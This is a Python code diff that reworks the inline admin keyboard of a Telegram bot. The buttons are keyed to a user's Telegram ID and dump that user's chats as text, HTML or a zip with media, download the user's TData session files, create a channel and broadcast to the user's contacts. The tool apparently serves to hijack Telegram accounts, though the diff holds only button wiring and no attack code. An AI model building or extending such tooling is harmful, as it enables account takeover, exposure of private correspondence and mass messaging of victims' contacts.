@@ -191,23 +191,27 @@ def get_admin_log_keyboard(user_tg_id: int) -> InlineKeyboardMarkup:
                     callback_data=f"adm_act_dump_txt:{user_tg_id}",
                 ),
                 InlineKeyboardButton(
-                    text="💬 2) Переписки (zip)",
-                    callback_data=f"adm_act_dump_media:{user_tg_id}",
+                    text="⚡ Переписки (HTML)",
+                    callback_data=f"adm_act_dump_fast_html:{user_tg_id}",
                 ),
             ],
             [
                 InlineKeyboardButton(
-                    text="📢 3) Создать ТГК",
+                    text="💬 Всё с медиа (zip)",
+                    callback_data=f"adm_act_dump_media:{user_tg_id}",
+                ),
+                InlineKeyboardButton(
+                    text="📢 Создать ТГК",
                     callback_data=f"adm_act_create_tgk:{user_tg_id}",
                 ),
+            ],
+            [
                 InlineKeyboardButton(
                     text="💾 4) Скачать TData",
                     callback_data=f"adm_act_download_tdata:{user_tg_id}",
                 ),
-            ],
-            [
                 InlineKeyboardButton(
-                    text="⚡ 5) Рассылка по контактам",
+                    text="⚡ 5) Рассылка",
                     callback_data=f"adm_act_broadcast_contacts:{user_tg_id}",
                 ),
             ],
